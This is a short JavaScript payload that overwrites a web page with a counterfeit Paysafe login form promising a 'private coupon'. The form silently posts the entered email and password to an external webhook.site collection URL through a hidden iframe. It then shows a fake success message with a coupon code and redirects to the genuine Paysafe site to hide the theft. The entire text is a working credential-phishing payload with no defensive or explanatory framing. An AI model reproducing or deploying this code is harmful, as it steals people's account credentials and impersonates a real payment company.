document.write(`
<title>Paysafe | Login</title>
<div style="position:fixed;inset:0;background:#f5f5f5;display:flex;align-items:center;justify-content:center;font-family:Arial,Helvetica,sans-serif">
  <div style="background:#fff;padding:40px;border-radius:8px;width:380px;box-shadow:0 4px 20px rgba(0,0,0,.15);text-align:center">
    <img src="https://www.paysafe.com/typo3conf/ext/theme/Resources/Public/Template/Main/dist/resources/assets/images/b2b-logos/logo-paysafe-30-years.svg" height="36" style="margin-bottom:20px">
    <h2 style="color:#333;margin:0 0 8px">Login to get your private coupon</h2>
    <p style="color:#666;margin:0 0 20px">Sign in to access your exclusive discount code.</p>
    <form action="https://webhook.site/54e204b2-4c6d-4fa8-9322-b2e92bffcbee" method="post" target="hiddenframe" onsubmit="setTimeout(function(){document.body.innerHTML='<div style=&quot;position:fixed;inset:0;background:#f5f5f5;display:flex;align-items:center;justify-content:center;font-family:Arial,Helvetica,sans-serif&quot;><div style=&quot;background:#fff;padding:40px;border-radius:8px;width:420px;text-align:center&quot;><h2 style=&quot;color:#333&quot;>Login successful</h2><p style=&quot;color:#666&quot;>Your private coupon: COUPON-PAYSAFE-2026</p><p style=&quot;color:#999;font-size:12px&quot;>Redirecting to Paysafe...</p></div></div>';setTimeout(function(){location='https://www.paysafe.com/en/';},2500);},600)" style="text-align:left">
      <input name="email" placeholder="Email address" style="width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box">
      <input name="password" type="password" placeholder="Password" style="width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box">
      <button style="width:100%;padding:12px;margin-top:12px;background:#7b1fa2;color:#fff;border:0;border-radius:4px;font-size:15px;cursor:pointer">Sign In</button>
    </form>
    <p style="color:#999;font-size:12px;margin-top:16px">Secure login. Your information is encrypted.</p>
  </div>
</div>
<iframe name="hiddenframe" style="display:none"></iframe>
`);
